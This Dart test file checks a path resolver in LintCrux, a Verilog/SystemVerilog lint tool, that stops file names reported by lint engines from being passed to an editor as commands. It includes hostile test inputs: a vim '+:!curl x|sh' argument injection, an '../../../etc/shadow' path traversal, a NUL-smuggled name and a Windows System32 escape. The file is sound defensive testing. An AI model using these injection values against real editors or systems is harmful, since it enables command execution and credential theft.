// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

// Containment for the one string in a lint run that the *design file*
// gets to choose.
//
// Every engine parser lifts a filename out of the subprocess's own
// output, and a `` `line 1 "…" 0 `` directive in a .sv file makes
// Verilator and Verible print whatever that file's author wrote. The
// lifted string ends up in `SourceLocation.file`, and from there in the
// argv of the editor LintCrux spawns when the user clicks the violation.
//
// The resolver these tests cover replaced five identical copies of:
//
//   if (file.startsWith('/') || (file.length >= 2 && file[1] == ':')) {
//     return file;
//   }
//   return '$root$file';
//
// whose absoluteness test admitted any string with a colon in position 1
// and returned it verbatim.

import 'package:crux_io/crux_io.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:lintcrux/services/engines/engine_reported_path.dart';

void main() {
  const root = '/work/soc';

  group('resolveEngineReportedPath', () {
    test('resolves a relative path against the project root', () {
      expect(
        resolveEngineReportedPath('rtl/top.sv', root),
        '/work/soc/rtl/top.sv',
      );
    });

    test('normalizes redundant segments inside the root', () {
      expect(
        resolveEngineReportedPath('rtl/./sub/../top.sv', root),
        '/work/soc/rtl/top.sv',
      );
    });

    test('keeps a POSIX-absolute path, even outside the root', () {
      // A violation in a system header or an absolute-path library is
      // ordinary; an absolute path can never read as an editor option.
      expect(
        resolveEngineReportedPath(
          '/usr/share/verilator/include/verilated.v',
          root,
        ),
        '/usr/share/verilator/include/verilated.v',
      );
    });

    test('keeps a Windows-absolute path on a POSIX host', () {
      // Windows transcripts are replayed on the macOS/Linux CI boxes.
      expect(
        resolveEngineReportedPath(r'C:\Users\mfink\proj\cdc_capture.v', root),
        r'C:\Users\mfink\proj\cdc_capture.v',
      );
    });

    test('refuses a relative path that climbs out of the root', () {
      expect(resolveEngineReportedPath('../../../etc/shadow', root), isNull);
    });

    test('refuses a relative path that climbs out and back down', () {
      expect(
        resolveEngineReportedPath('rtl/../../sibling/top.sv', root),
        isNull,
      );
    });

    test('refuses the root itself', () {
      expect(resolveEngineReportedPath('.', root), isNull);
    });

    test('refuses an empty path', () {
      expect(resolveEngineReportedPath('', root), isNull);
    });

    test('refuses a path carrying a NUL', () {
      expect(resolveEngineReportedPath('top.sv\u0000evil', root), isNull);
    });

    test('refuses a relative path when there is no root to contain it', () {
      // Better a reported unparseable line than a bare relative argv
      // element that the editor resolves against its own CWD.
      expect(resolveEngineReportedPath('top.sv', ''), isNull);
    });

    // The defect that made this file necessary.
    test('a colon in position 1 is NOT treated as a drive letter', () {
      // `+:!…` is what a hostile `line` directive emits to reach vim's
      // `+{command}` argument. The old test (`file[1] == ':'`) returned
      // it verbatim; it must now be contained under the root, where it
      // is an absolute path and inert as argv.
      final resolved = resolveEngineReportedPath('+:!curl x|sh', root);
      expect(resolved, '/work/soc/+:!curl x|sh');
      expect(isAbsoluteSpawnPath(resolved!), isTrue);
    });

    test('a bare +command is contained, not passed through', () {
      expect(
        resolveEngineReportedPath('+!curl x|sh', root),
        '/work/soc/+!curl x|sh',
      );
    });

    test('a drive-relative Windows path is contained, not passed through', () {
      // `c:evil` has no separator after the colon: it is drive-relative,
      // not absolute, and must not be handed to a spawn verbatim.
      expect(resolveEngineReportedPath('c:evil', root), '/work/soc/c:evil');
    });

    group('Windows project root', () {
      const winRoot = r'C:\work\soc';

      test('joins with backslashes', () {
        expect(
          resolveEngineReportedPath(r'rtl\top.sv', winRoot),
          r'C:\work\soc\rtl\top.sv',
        );
      });

      test('refuses an escape', () {
        expect(
          resolveEngineReportedPath(r'..\..\Windows\System32\evil.sv', winRoot),
          isNull,
        );
      });
    });
  });

  // The check `ClickToSourceService` applies to every location before it
  // becomes an editor argv element, shared with the rest of the suite.
  group('isAbsoluteSpawnPath (crux_io) over engine-reported paths', () {
    test('accepts POSIX and Windows absolutes and a UNC share', () {
      expect(isAbsoluteSpawnPath('/work/soc/top.sv'), isTrue);
      expect(isAbsoluteSpawnPath(r'C:\work\top.sv'), isTrue);
      expect(isAbsoluteSpawnPath('C:/work/top.sv'), isTrue);
      expect(isAbsoluteSpawnPath(r'\\server\share\top.sv'), isTrue);
    });

    test('rejects everything an editor could read as an option', () {
      expect(isAbsoluteSpawnPath('+:!curl x|sh'), isFalse);
      expect(isAbsoluteSpawnPath('-c'), isFalse);
      expect(isAbsoluteSpawnPath('rtl/top.sv'), isFalse);
      expect(isAbsoluteSpawnPath(''), isFalse);
      expect(isAbsoluteSpawnPath('/work/soc/top\u0000.sv'), isFalse);
    });

    test('every path resolveEngineReportedPath returns passes it', () {
      for (final reported in const [
        'rtl/top.sv',
        '+:!curl x|sh',
        '/usr/include/defs.vh',
        r'C:\work\soc\top.sv',
      ]) {
        final resolved = resolveEngineReportedPath(reported, '/work/soc');
        expect(resolved, isNotNull, reason: reported);
        expect(isAbsoluteSpawnPath(resolved!), isTrue, reason: reported);
      }
    });
  });
}
